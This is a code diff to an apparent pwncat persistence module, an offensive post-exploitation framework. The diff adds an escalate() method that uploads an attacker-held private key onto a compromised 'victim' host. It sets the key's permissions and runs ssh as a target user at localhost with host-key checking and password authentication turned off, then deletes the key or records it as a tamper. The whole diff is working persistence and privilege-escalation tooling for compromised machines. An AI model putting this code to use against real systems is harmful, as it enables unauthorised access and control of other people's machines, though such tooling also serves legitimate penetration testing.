@@ -1,4 +1,5 @@
 import os
+import shutil
 from typing import Optional
 
 import pwncat
@@ -14,7 +15,7 @@ class Method(PersistenceMethod):
     # module.
     system = False
     name = "authorized_keys"
-    local = False
+    local = True
 
     def install(self, user: Optional[str] = None):
 
@@ -133,3 +134,59 @@ class Method(PersistenceMethod):
                 if pubkey[0] in tamper.added_lines:
                     pwncat.victim.tamper.remove(tamper)
                     break
+
+    def escalate(self, user: Optional[str] = None) -> bool:
+        """ Utilize this persistence method to get a local shell """
+
+        try:
+            # Ensure there is an SSH server
+            sshd = pwncat.victim.find_service("sshd")
+        except ValueError:
+            return False
+
+        # Ensure it is running
+        if not sshd.running:
+            return False
+
+        # Upload the private key
+        with pwncat.victim.tempfile(
+            "w", length=os.path.getsize(pwncat.victim.config["privkey"])
+        ) as dst:
+            with open(pwncat.victim.config["privkey"], "r") as src:
+                shutil.copyfileobj(src, dst)
+
+            privkey_path = dst.name
+
+        # Ensure correct permissions
+        try:
+            pwncat.victim.env(["chmod", "600", privkey_path])
+        except FileNotFoundError:
+            # We don't have chmod :( this probably won't work, but
+            # we can try it.
+            pass
+
+        # Run SSH, disabling password authentication to force public key
+        # Don't wait for the result, because this won't exit
+        pwncat.victim.env(
+            [
+                "ssh",
+                "-i",
+                privkey_path,
+                "-o",
+                "StrictHostKeyChecking=no",
+                "-o",
+                "PasswordAuthentication=no",
+                f"{user}@localhost",
+            ],
+            wait=False,
+        )
+
+        # Delete the private key. This either worked and we didn't need it
+        # or it didn't work and we still don't need it.
+        try:
+            pwncat.victim.env(["rm", "-f", privkey_path])
+        except FileNotFoundError:
+            # File removal failed because `rm` doesn't exist. Register it as a tamper.
+            pwncat.victim.tamper.created_file(privkey_path)
+
+        return True
